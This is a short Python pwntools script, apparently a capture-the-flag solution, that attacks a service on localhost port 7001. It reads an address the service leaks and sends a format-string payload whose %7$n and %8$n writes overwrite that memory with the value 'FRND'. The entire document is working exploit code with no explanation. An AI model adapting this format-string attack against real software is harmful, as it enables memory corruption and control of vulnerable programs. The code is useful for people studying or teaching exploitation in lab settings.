#!/usr/bin/python

from pwn import *
import re

host = "127.0.0.1"
port = 7001
write = "FRND"

c = remote(host, port)
#c = process("../lots")

reply = c.recvline()
addr = re.search('0x(.{8})', reply).group(0)
print("Address to overwrite: %s" % (addr))
addr = int(addr, 0)

c.recvline()

payload = "X"
payload += p32(addr)
payload += p32(addr+2)
payload += "%21053x"
payload += "%7$n"
payload += "%61960x"
payload += "%8$n"

c.sendline(payload)

print c.recvall()

